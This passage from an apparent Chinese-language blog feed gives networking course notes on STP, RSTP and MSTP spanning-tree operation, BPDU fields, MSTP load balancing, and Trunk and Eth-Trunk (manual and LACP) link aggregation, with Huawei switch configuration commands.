src="/../img/img_artical/net_sec/4.2.3.png" alt="4.2.3"></p><p><strong>环路导致广播风暴</strong></p><ul><li>交换机收到广播帧后，会从除接收端口外的其他所有接口广播</li><li>广播帧在交换机之间一直循环下去，众多的广播帧最终形成广播风暴</li></ul><p><img src="/../img/img_artical/net_sec/4.2.4.png" alt="4.2.4"></p><p><strong>广播风暴导致网络瘫痪</strong></p><ul><li>广播帧增多形成广播风暴，从而导致链路拥塞，并极大消耗设备资源，最终导致网络拥塞不可用，还会导致设备宕机不可用</li></ul><p><img src="/../img/img_artical/net_sec/4.2.5.png" alt="4.2.5"></p><h3 id="STP概述"><a href="#STP概述" class="headerlink" title="STP概述"></a>STP概述</h3><p><strong>STP：生成树协议 （IEEE802.1d）</strong></p><ul><li>STP：Spanning Tree Protocol（生成树协议）</li><li>通过阻塞某个接口在逻辑上断开环路，防止广播风暴，破除二层环路</li><li>当主线路故障，阻塞接口被激活，主线路恢复，备份线路再次被阻塞</li><li>交换机之间通过周期性的发送BPDU报文，来实现STP的功能</li></ul><p><img src="/../img/img_artical/net_sec/4.2.6.png" alt="4.2.6"></p><p><strong>BPDU：桥协议数据单元</strong></p><ul><li>Bridge Protocol Data Unit ，桥协议数据单元，即STP协议的报文</li><li>也称二层的”心跳报文”，周期性发送，默认每2秒发送1次</li><li>组播发送，组播MAC地址为：01-80-C2-00-00-00</li></ul><h2 id="STP工作原理"><a href="#STP工作原理" class="headerlink" title="STP工作原理"></a>STP工作原理</h2><h3 id="STP工作原理-1"><a href="#STP工作原理-1" class="headerlink" title="STP工作原理"></a>STP工作原理</h3><ul><li><p>步骤一：选举根交换机</p></li><li><p>步骤二：在每个非根交换机上选举一个根端口</p></li><li><p>步骤三：在每条链路上选举一个指定端口</p></li><li><p>步骤四：阻塞非根端口、非指定端口</p></li></ul><p><img src="/../img/img_artical/net_sec/4.2.7.png" alt="4.2.7"></p><h3 id="选举根交换机"><a href="#选举根交换机" class="headerlink" title="选举根交换机"></a>选举根交换机</h3><p><strong>根网桥（根交换机）</strong></p><ul><li>STP引入了根桥（Root Bridge）概念</li><li>在一个STP网络中，根桥只有一个</li><li>STP初始化时，所有的交换机都认为自己是”根交换机”</li><li>交换机之间通过比较BID的来确定根交换机，BID值小的为根交换机</li></ul><p><strong>网桥ID（BID）</strong></p><ul><li>STP协议为交换机取的名字，用于在交换网络中唯一标识该设备</li><li>BID是优先级与MAC地址组成，BID值越小越优先</li><li>BID优先级取值范围：0~61440、默认值是:32768</li><li>BID优先级步长值：4096 (0或4096的倍数)</li></ul><p><img src="/../img/img_artical/net_sec/4.2.8.png" alt="4.2.8"></p><p><strong>通常根据BID优先级，选择根交换机</strong></p><ul><li>BID值小的为根交换机，首先比较优先级，优先级小的为根交换机</li><li>如果优先级一致，则MAC地址小的为根交换机</li></ul><p><img src="/../img/img_artical/net_sec/4.2.9.png" alt="4.2.9"></p><h3 id="STP配置命令"><a href="#STP配置命令" class="headerlink" title="STP配置命令"></a>STP配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1.启动或关闭交换机的STP功能，默认情况下交换机的STP功能处于开启状态</span></span><br><span class="line"><span class="attr">[Huawei]stp</span> <span class="string">&#123;enable | disable&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.选择交换机的STP运行模式，默认情况下交换机的STP运行模式为MSTP</span></span><br><span class="line"><span class="attr">[Huawei]stp</span> <span class="string">mode &#123;stp | rstp | mstp&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">3.修改交换机的STP优先级，设置根交换机</span></span><br><span class="line"><span class="attr">[Huawei]stp</span> <span class="string">priority 4096</span></span><br><span class="line"></span><br><span class="line"><span class="attr">4.查看生成树状态信息</span></span><br><span class="line"><span class="attr">[Huawei]display</span> <span class="string">stp</span></span><br></pre></td></tr></table></figure><h2 id="选举根端口和指定端口"><a href="#选举根端口和指定端口" class="headerlink" title="选举根端口和指定端口"></a>选举根端口和指定端口</h2><h3 id="选举根端口"><a href="#选举根端口" class="headerlink" title="选举根端口"></a>选举根端口</h3><p><strong>根端口定律</strong></p><ul><li>非根交换机中有且只有一个根端口</li></ul><p><strong>选举根端口原则</strong></p><ul><li>非根交换机到根交换机的根路径开销值最小的端口（此端口到根的路径成本之和最低）如果根路径开销值相同，则比较对端交换机的BID，越小越优</li><li>如果对端BID也相同，则比较对端的PID，越小越优（PID由端口优先级和端口号组成优先级取值范围：0~240、步长值为16、端口优先级默认为128，所以端口号小PID就小）</li></ul><p><img src="/../img/img_artical/net_sec/4.2.10.png" alt="4.2.10"></p><p><strong>路径开销（路径成本）：Cost</strong></p><ul><li>交换机的每一个端口都有一个路径开销-Cost值</li><li>交换机端口Cost值和端口带宽有关，带宽越高，Cost值越小</li><li>默认情况下千兆端口开销为20000</li><li>默认情况下百兆端口开销为200000</li></ul><p><img src="/../img/img_artical/net_sec/4.2.11.png" alt="4.2.11"></p><p><strong>在非根网桥SW2&#x2F;SW3上，选择一个根端口（RP）</strong></p><ul><li>到根交换机的根路径开销值最小的端口，即根端口</li><li>SW2&#x2F;SW3的根端口为G0&#x2F;0&#x2F;1</li></ul><p><img src="/../img/img_artical/net_sec/4.2.12.png" alt="4.2.12"></p><h3 id="选举指定端口"><a href="#选举指定端口" class="headerlink" title="选举指定端口"></a>选举指定端口</h3><p><strong>指定端口定律</strong></p><ul><li>在每条链路上选择一个指定端口</li><li>根交换机的接口全是指定端口</li></ul><p><strong>选举指定端口原则</strong></p><ul><li>一条链路上，到根交换机的根路径开销值最小的端口，即指定端口</li><li>如果根路径开销相同，则比较接口所在交换机的BID，越小越优</li><li>如果交换机的BID也相同，则比较PID，越小越优</li></ul><h2 id="BPDU"><a href="#BPDU" class="headerlink" title="BPDU"></a>BPDU</h2><h3 id="BPDU-1"><a href="#BPDU-1" class="headerlink" title="BPDU"></a>BPDU</h3><p><strong>BPDU的4个关键字段，用于选举交换机角色和端口角色</strong></p><table><thead><tr><th align="center">BPDU报文字段</th><th align="center">字段作用</th></tr></thead><tbody><tr><td align="center">协议ID</td><td align="center"></td></tr><tr><td align="center">协议版本号</td><td align="center"></td></tr><tr><td align="center">报文类型</td><td align="center"></td></tr><tr><td align="center">拓扑变化标志</td><td align="center"></td></tr><tr><td align="center"><font color="#ff0000"><strong>根网桥ID</strong></font></td><td align="center"><font color="#ff0000"><strong>当前根桥的BID</strong></font></td></tr><tr><td align="center"><font color="#ff0000"><strong>根路径开销</strong></font></td><td align="center"><font color="#ff0000"><strong>本端口累计到根桥的开销值（Cost）</strong></font></td></tr><tr><td align="center"><font color="#ff0000"><strong>发送网桥ID</strong></font></td><td align="center"><font color="#ff0000"><strong>本交换设备的BID</strong></font></td></tr><tr><td align="center"><font color="#ff0000"><strong>端口ID</strong></font></td><td align="center"><font color="#ff0000"><strong>发送该BPDU报文的端口ID（PID）</strong></font></td></tr><tr><td align="center">报文老化时间</td><td align="center"></td></tr><tr><td align="center">消息老化时间</td><td align="center"></td></tr><tr><td align="center">发送报文间隔时间</td><td align="center"></td></tr><tr><td align="center">转发延迟时间</td><td align="center"></td></tr></tbody></table><h3 id="BPDU类型"><a href="#BPDU类型" class="headerlink" title="BPDU类型"></a>BPDU类型</h3><ul><li>配置 BPDU</li><li>拓扑变更BPDU</li></ul><h3 id="STP的收敛"><a href="#STP的收敛" class="headerlink" title="STP的收敛"></a>STP的收敛</h3><p><strong>STP端口的5种状态</strong></p><table><thead><tr><th>状态</th><th>用途</th></tr></thead><tbody><tr><td>禁用（Disabled）</td><td>强制关闭，没有启用STP协议</td></tr><tr><td>阻塞（Blocking）</td><td>只接收BPDU，不能发送BPDU</td></tr><tr><td>侦听（Listening）</td><td>比较BPDU，确定交换机角色和端口角色</td></tr><tr><td>学习（Learning）</td><td>基于端口上收到的数据帧，学习MAC地址表</td></tr><tr><td>转发（Forwarding）</td><td>端口的最终完美状态，发送和接收用户数据</td></tr></tbody></table><p><strong>STP的3种计时器，用于维护STP</strong></p><ul><li>Hello时间：端口发送BPDU报文的时间间隔，默认是2s</li><li>转发延迟（Forward delay）：端口从侦听到学习状态，分别停留的时间，15s</li><li>最大老化时间（Max Age）：一个端口最大的”没有接收BPDU”的时间间隔，20s</li></ul><p><strong>STP的收敛时间为：30~50s，非常慢</strong></p><ul><li>根交换机故障，STP的收敛时间约50秒</li><li>链路故障：STP的收敛时间约30~50秒</li></ul><p><img src="/../img/img_artical/net_sec/4.2.13.png" alt="4.2.13"></p><h2 id="MSTP工作原理及配置"><a href="#MSTP工作原理及配置" class="headerlink" title="MSTP工作原理及配置"></a>MSTP工作原理及配置</h2><h3 id="STP回顾"><a href="#STP回顾" class="headerlink" title="STP回顾"></a>STP回顾</h3><p><strong>弊端</strong></p><ul><li>收敛时间慢：30s~50s</li><li>设备利用率低</li></ul><p><strong>方案</strong></p><ul><li>RSTP，快速生成树协议</li><li>MSTP，多生成树协议</li></ul><h3 id="RSTP概述"><a href="#RSTP概述" class="headerlink" title="RSTP概述"></a>RSTP概述</h3><p><strong>RSTP：快速生成树协议</strong></p><ul><li>公有协议：IEEE802.1w</li><li>STP的基础上优化而来</li><li>实现网络的快速收敛，降低网络故障时间，提高数据转发的效率</li></ul><p><strong>RSTP对STP的改进</strong></p><ul><li>增加了2种端口角色（AP和BP）<ul><li>Backup Port（备份端口）主要是由于Designated Port的故障而触发的。当Designated Port发生故障时，Backup Port会立即开始转发数据</li><li>Alternate Port（备用端口）网络拓扑发生变化时触发状态转换，并转变为指定（designated）端口或根（root）端口，从而提供冗余路径</li></ul></li><li>减少了3个端口状态（阻塞、学习、转发合为一种）</li><li>引入了让指定端口尽快进入转发状态的机制（P&#x2F;A机制）</li></ul><p><strong>RSTP的不足</strong></p><ul><li>RSTP和STP有一个共同缺陷：局域网内所有的VLAN共享一颗生成树</li><li>所有的VLAN的数据转发路径是相同的</li><li>交换机之间的多个链路，只能实现备份的作用，永远只会使用其中的主链路转发数据，无法实现VLAN数据流的负载均衡，从而无法提高设备利用率，还有可能造成部分VLAN的数据流无法转发。</li></ul><h3 id="MSTP概述"><a href="#MSTP概述" class="headerlink" title="MSTP概述"></a>MSTP概述</h3><p><strong>MSTP，即Multiple STP，多生成树协议</strong></p><ul><li>RSTP的基础上优化而来</li><li>MSTP网络中，引入了域的概念，称为MST域</li><li>每个MST域中包含一个或多个”生成树”称之为”实例”</li><li>引入了实例”instance”的概念，实现VLAN数据流的负载均衡</li><li>默认情况下，所有的VLAN都属于同一个默认的实例 –  instance 0</li><li>可以基于需求，将不同的VLAN分配到不同的实例中</li><li>不同的实例，就是不同的生成树，就对应着多个不同的根桥</li></ul><h3 id="配置思路"><a href="#配置思路" class="headerlink" title="配置思路"></a>配置思路</h3><p><strong>每个交换机创建相同的VLAN</strong></p><p><strong>交换机之间的链路配置为 Trunk，允许所有的VLAN通过</strong></p><p><strong>交换机启用STP协议，配置模式为MSTP</strong></p><p><strong>交换机指定MST域的域名、实例和vlan的对应关系</strong></p><p><strong>交换机上激活MST域的配置</strong></p><p><strong>验证与测试MST域的配置</strong></p><p><strong>同一个MST域的交换机配置特点：</strong></p><ul><li>都启动了MSTP</li><li>域名配置相同</li><li>实例配置相同</li></ul><h2 id="MSTP负载均衡"><a href="#MSTP负载均衡" class="headerlink" title="MSTP负载均衡"></a>MSTP负载均衡</h2><h3 id="MSTP负载均衡-1"><a href="#MSTP负载均衡-1" class="headerlink" title="MSTP负载均衡"></a>MSTP负载均衡</h3><p><strong>STP&#x2F;RSTP的弊端</strong></p><ul><li>所有的VLAN共用一个”生成树”，防止环路的同时只能确保一半的设备得到利用，另外一半的设备仅仅用作”备份”，无法提高设备的利用率</li></ul><p><strong>MSTP负载均衡</strong></p><ul><li>不同的VLAN关联到不同的实例</li><li>不同的实例的根交换机放置在不同的交换机上</li><li>不同的VLAN通过不同的根交换机进行数据的转发，从而确保提高设备的利用率，同时设备之间还能实现备份</li></ul><p><img src="/../img/img_artical/net_sec/4.2.14.png" alt="4.2.14"></p><p><strong>需求描述</strong></p><ul><li><p>PC1属于VLAN10，IP地址为192.168.10.1&#x2F;24，网关为192.168.10.254</p></li><li><p>PC2属于VLAN20，IP地址为192.168.20.1&#x2F;24，网关为192.168.20.254</p></li><li><p>确保PC1与PC2互通</p></li><li><p>合理配置MSTP，确保PC1与PC2之间的互通路径是最优的</p></li><li><p>配置命令</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1.S1、S2、S3创建vlan并配置连接交换机的端口为trunk</span></span><br><span class="line"><span class="attr">[S1]VLAN</span> <span class="string">batch 10 20</span></span><br><span class="line"><span class="attr">[S1]port-group</span> <span class="string">1</span></span><br><span class="line"><span class="attr">[S1-port-group-1]group-member</span> <span class="string">G0/0/3 G0/0/10</span></span><br><span class="line"><span class="attr">[S1-port-group-1]port</span> <span class="string">link-type trunk </span></span><br><span class="line"><span class="attr">[S1-port-group-1]port</span> <span class="string">trunk allow-pass vlan ALL</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[S2]VLAN</span> <span class="string">batch 10 20</span></span><br><span class="line"><span class="attr">[S2]port-group</span> <span class="string">1</span></span><br><span class="line"><span class="attr">[S2-port-group-1]group-member</span> <span class="string">G0/0/4 G0/0/10</span></span><br><span class="line"><span class="attr">[S2-port-group-1]port</span> <span class="string">link-type trunk </span></span><br><span class="line"><span class="attr">[S2-port-group-1]port</span> <span class="string">trunk allow-pass vlan ALL</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[S3]VLAN</span> <span class="string">batch 10 20</span></span><br><span class="line"><span class="attr">[S3]port-group</span> <span class="string">1</span></span><br><span class="line"><span class="attr">[S3-port-group-1]group-member</span> <span class="string">G0/0/5 G0/0/6</span></span><br><span class="line"><span class="attr">[S3-port-group-1]port</span> <span class="string">link-type trunk </span></span><br><span class="line"><span class="attr">[S3-port-group-1]port</span> <span class="string">trunk allow-pass vlan ALL</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.S1、S2、S3配置MSTP区域并激活</span></span><br><span class="line"><span class="attr">[S1]stp</span> <span class="string">mode mstp 启用MSTP协议</span></span><br><span class="line"><span class="attr">[S1]stp</span> <span class="string">region-configuration 创建区域</span></span><br><span class="line"><span class="attr">[S1-mst-region]region-name</span> <span class="string">ntd 定义区域名为ntd</span></span><br><span class="line"><span class="attr">[S1-mst-region]instance</span> <span class="string">1 vlan 10 指定vlan与实例的对应关系</span></span><br><span class="line"><span class="attr">[S1-mst-region]instance</span> <span class="string">2 vlan 20</span></span><br><span class="line"><span class="attr">[S1-mst-region]active</span> <span class="string">region-configuration 激活区域配置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">[S2]stp</span> <span class="string">mode mstp 启用MSTP协议</span></span><br><span class="line"><span class="attr">[S2]stp</span> <span class="string">region-configuration 创建区域</span></span><br><span class="line"><span class="attr">[S2-mst-region]region-name</span> <span class="string">ntd 定义区域名为ntd</span></span><br><span class="line"><span class="attr">[S2-mst-region]instance</span> <span class="string">1 vlan 10 指定vlan与实例的对应关系</span></span><br><span class="line"><span class="attr">[S2-mst-region]instance</span> <span class="string">2 vlan 20</span></span><br><span class="line"><span class="attr">[S2-mst-region]active</span> <span class="string">region-configuration 激活区域配置</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[S3]stp</span> <span class="string">mode mstp 启用MSTP协议</span></span><br><span class="line"><span class="attr">[S3]stp</span> <span class="string">region-configuration 创建区域</span></span><br><span class="line"><span class="attr">[S3-mst-region]region-name</span> <span class="string">ntd 定义区域名为ntd</span></span><br><span class="line"><span class="attr">[S3-mst-region]instance</span> <span class="string">1 vlan 10 指定vlan与实例的对应关系</span></span><br><span class="line"><span class="attr">[S3-mst-region]instance</span> <span class="string">2 vlan 20</span></span><br><span class="line"><span class="attr">[S3-mst-region]active</span> <span class="string">region-configuration 激活区域配置</span></span><br><span class="line"></span><br><span class="line"><span class="attr">3.配置S1为vlan10的主根、vlan20的次根网桥并查看配置</span></span><br><span class="line"><span class="attr">[S1]stp</span> <span class="string">instance 1 priority 4096</span></span><br><span class="line"><span class="attr">[S1]stp</span> <span class="string">instance 2 priority 8192</span></span><br><span class="line"></span><br><span class="line"><span class="attr">4.配置S2为vlan20的主根、vlan10的次根根网桥并查看配置</span></span><br><span class="line"><span class="attr">[S2]stp</span> <span class="string">instance2 priority 4096</span></span><br><span class="line"><span class="attr">[S2]stp</span> <span class="string">instance 1 priority 8192</span></span><br><span class="line"></span><br><span class="line"><span class="attr">5.配置PC1加入vlan10、PC2加入vlan20</span></span><br><span class="line"><span class="attr">[S3]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[S3-GigabitEthernet0/0/1]port</span> <span class="string">link-type access </span></span><br><span class="line"><span class="attr">[S3-GigabitEthernet0/0/1]port</span> <span class="string">default vlan 10</span></span><br><span class="line"><span class="attr">[S3]interface</span> <span class="string">GigabitEthernet 0/0/2</span></span><br><span class="line"><span class="attr">[S3-GigabitEthernet0/0/2]port</span> <span class="string">link-type access </span></span><br><span class="line"><span class="attr">[S3-GigabitEthernet0/0/2]port</span> <span class="string">default vlan 20</span></span><br><span class="line"></span><br><span class="line"><span class="attr">6.配置S1与路由相连的接口加入vlan10</span></span><br><span class="line"><span class="attr">[S1]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[S1-GigabitEthernet0/0/1]port</span> <span class="string">link-type access </span></span><br><span class="line"><span class="attr">[S1-GigabitEthernet0/0/1]port</span> <span class="string">default vlan 10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">7.配置S2与路由相连的接口加入</span> <span class="string">vlan20</span></span><br><span class="line"><span class="attr">[S2]interface</span> <span class="string">GigabitEthernet 0/0/2</span></span><br><span class="line"><span class="attr">[S2-GigabitEthernet0/0/2]port</span> <span class="string">link-type access </span></span><br><span class="line"><span class="attr">[S2-GigabitEthernet0/0/2]port</span> <span class="string">default vlan 20</span></span><br><span class="line"></span><br><span class="line"><span class="attr">8.配置路由器接口IP</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/1]ip</span> <span class="string">address 192.168.10.254 24</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet 0/0/2</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/2]ip</span> <span class="string">address 192.168.20.254 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">9.测试与验证</span></span><br><span class="line"><span class="attr">pc1</span> <span class="string">ping  pc2  通</span></span><br><span class="line"></span><br><span class="line"><span class="attr">10.查看验证</span></span><br><span class="line"> <span class="attr">&lt;SW3&gt;display</span> <span class="string">stp brief </span></span><br><span class="line"><span class="attr">查看S1的instance</span> <span class="string">1 g0/0/3 g0/0/10都是指定接口</span></span><br><span class="line"><span class="attr">查看S2的instance</span> <span class="string">2 g0/0/4 g0/0/10都是指定接口  </span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 弹性交换网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-弹性交换网络1</title>
      <link href="/posts/switching1.html"/>
      <url>/posts/switching1.html</url>
      
        <content type="html"><![CDATA[<h1 id="弹性交换网络"><a href="#弹性交换网络" class="headerlink" title="弹性交换网络"></a>弹性交换网络</h1><h2 id="Trunk原理与配置"><a href="#Trunk原理与配置" class="headerlink" title="Trunk原理与配置"></a>Trunk原理与配置</h2><h3 id="Vlan内通信"><a href="#Vlan内通信" class="headerlink" title="Vlan内通信"></a>Vlan内通信</h3><p><strong>实现跨交换的同Vlan通信</strong></p><p><img src="/../img/img_artical/net_sec/4.1.1.png" alt="4.1.1"></p><h3 id="Trunk接口"><a href="#Trunk接口" class="headerlink" title="Trunk接口"></a>Trunk接口</h3><p><strong>场景</strong></p><ul><li>通常用于交换机与交换机互连</li></ul><p><strong>特点</strong></p><ul><li>同时可以属于多个VLAN</li><li>接收数据帧，检查数据帧中的vlan标签，判断是否允许这个vlan标签通过，如果允许则接收数据帧，如果不允许则丢弃数据</li><li>转发数据帧，检查数据帧中的vlan标签，判断是否允许这个vlan标签通过，如果不允许则丢弃数据，如果允许，且vlan标签与接口Pvid相同，则剥离标签后转发，如果不相同则直接转发</li></ul><h3 id="Hybrid接口"><a href="#Hybrid接口" class="headerlink" title="Hybrid接口"></a>Hybrid接口</h3><p><strong>场景</strong></p><ul><li>既可以连接用户终端，也可以连接交换机&#x2F;路由器</li></ul><p><strong>特点</strong></p><ul><li>同时可以属于多个VLAN</li><li>可以像Access 接口一样，发送出去的数据不携带标签</li><li>可以像Trunk 接口一样，发送出去的数据携带标签</li><li>可以灵活控制接口上发送的数据帧是否携带标签</li></ul><h3 id="配置Trunk接口"><a href="#配置Trunk接口" class="headerlink" title="配置Trunk接口"></a>配置Trunk接口</h3><p><strong>配置命令</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[SW1]vlan</span> <span class="string">batch vlan 1 to 10          //创建vlan</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">G0/0/0                 //进入接口</span></span><br><span class="line"><span class="attr">[SW1-G0/0/0]port</span> <span class="string">link-type trunk      //设置接口为trunk</span></span><br><span class="line"><span class="attr">[SW1-G0/0/0]port</span> <span class="string">trunk allow-pass vlan all     //设置trunk允许通过的vlan</span></span><br></pre></td></tr></table></figure><h2 id="Eth-Trunk原理"><a href="#Eth-Trunk原理" class="headerlink" title="Eth-Trunk原理"></a>Eth-Trunk原理</h2><h3 id="组网中经常遇到的问题"><a href="#组网中经常遇到的问题" class="headerlink" title="组网中经常遇到的问题"></a>组网中经常遇到的问题</h3><p><img src="/../img/img_artical/net_sec/4.1.2.png" alt="4.1.2"></p><h3 id="链路聚合技术"><a href="#链路聚合技术" class="headerlink" title="链路聚合技术"></a>链路聚合技术</h3><p><strong>概述</strong></p><ul><li>Eth-Trunk(链路聚合技术)作为一种捆绑技术，可以把多个独立的物理接口绑定在起，作为一个大带宽的逻辑接口使用</li></ul><p><strong>好处</strong></p><ul><li>增加设备之间的互联带宽</li><li>提高设备之间的可靠性</li><li>对流量负载均衡，提高链路利用率</li></ul><p><img src="/../img/img_artical/net_sec/4.1.3.png" alt="4.1.3"></p><h3 id="Eth-Trunk概念"><a href="#Eth-Trunk概念" class="headerlink" title="Eth-Trunk概念"></a>Eth-Trunk概念</h3><p><strong>Eth-Trunk链路聚合模式</strong></p><ul><li>手工模式</li><li>LACP模式</li></ul><h3 id="手工模式"><a href="#手工模式" class="headerlink" title="手工模式"></a>手工模式</h3><p><strong>当设备不支持LACP协议时，使用手工模式</strong></p><ul><li>手工模式下3条活动链路都参与数据转发并分担流量</li><li>当一条链路故障时，在剩余的2条活动链路中分担流量</li></ul><p><img src="/../img/img_artical/net_sec/4.1.4.png" alt="4.1.4"></p><h3 id="配置手工模式Eth-Trunk"><a href="#配置手工模式Eth-Trunk" class="headerlink" title="配置手工模式Eth-Trunk"></a>配置手工模式Eth-Trunk</h3><p><strong>手工模式链路聚合配置命令</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[SW1]interface</span> <span class="string">Eth-Trunk 1                //创建并进入 eth-trunk 1</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]mode</span> <span class="string">manual load-balance     //配置手工模式</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]trunk</span> <span class="string">port G0/0/1         //加入成员端口</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]trunk</span> <span class="string">port G0/0/2         //加入成员端口</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]port</span> <span class="string">link-type trunk      //配置 eth-trunk 类型为 trunk</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]port</span> <span class="string">trunk allow-pass vlan all  //允许所有的 vlan</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SWl]display</span> <span class="string">eth-trunk 1           //查看当前设备的 eth-trunk 1的配置</span></span><br></pre></td></tr></table></figure><h2 id="LACP模式Eth-trunk配置"><a href="#LACP模式Eth-trunk配置" class="headerlink" title="LACP模式Eth-trunk配置"></a>LACP模式Eth-trunk配置</h2><h3 id="LACP模式"><a href="#LACP模式" class="headerlink" title="LACP模式"></a>LACP模式</h3><p><strong>LACP模式也称为M:N模式</strong></p><ul><li>M条活动链路，N条备份链路</li><li>当活动链路出现故障时，备份链路才进行转发</li></ul><h3 id="LACP模式工作原理"><a href="#LACP模式工作原理" class="headerlink" title="LACP模式工作原理"></a>LACP模式工作原理</h3><p><strong>LACP模式工作原理</strong></p><ul><li>确定主动端</li><li>确定活动链路</li><li>LACP抢占功能</li></ul><h3 id="确定LACP主动端"><a href="#确定LACP主动端" class="headerlink" title="确定LACP主动端"></a>确定LACP主动端</h3><p><strong>确定LACP主动端</strong></p><ul><li>通过比较两端设备的系统优先级来确定LACP主动端</li><li>系统优先级越小越优先，默认值为32768</li><li>如果系统优先级相同，则比较两端设备的MAC地址，越小越优先</li></ul><h3 id="确定LACP活动链路"><a href="#确定LACP活动链路" class="headerlink" title="确定LACP活动链路"></a>确定LACP活动链路</h3><ul><li>选出主动端后，以主动端的接口优先级来选择活动接口</li><li>如果主动端的接口优先级相同，则选择接口编号小的为活动接口</li><li>两端设备的活动端口建立的活动链路以负载分担的方式转发数据</li><li>可以设置活动端口的数量</li></ul><h3 id="开启LACP抢占功能"><a href="#开启LACP抢占功能" class="headerlink" title="开启LACP抢占功能"></a>开启LACP抢占功能</h3><ul><li>开启LACP抢占后，链路聚合组会始终选择高优先级的接口作为活动接口</li><li>活动接口故障后，备份链路的接口被激活，承担数据转发任务</li><li>活动接口恢复后，优先级高于备份接口，进行抢占，重新成为活动端口</li></ul><h3 id="配置LACP模式的Eth-Trunk"><a href="#配置LACP模式的Eth-Trunk" class="headerlink" title="配置LACP模式的Eth-Trunk"></a>配置LACP模式的Eth-Trunk</h3><p><strong>配置命令</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[SWl]lacp</span> <span class="string">priority 100      //设置LACP 系统优先级</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">Eth-Trunk 1  //创建并进入 eth-trunk 1</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]mode</span> <span class="string">lacp-static   //设置为LACP模式</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]trunk</span> <span class="string">port g0/0/1   //添加成员接口</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunkl]trunk</span> <span class="string">port g0/0/2</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]trunk</span> <span class="string">port g0/0/3</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunkl]port</span> <span class="string">link-type trunk  //设置trunk模式</span></span><br><span class="line"><span class="attr">[SW1-Eth-Trunk1]port</span> <span class="string">trunk 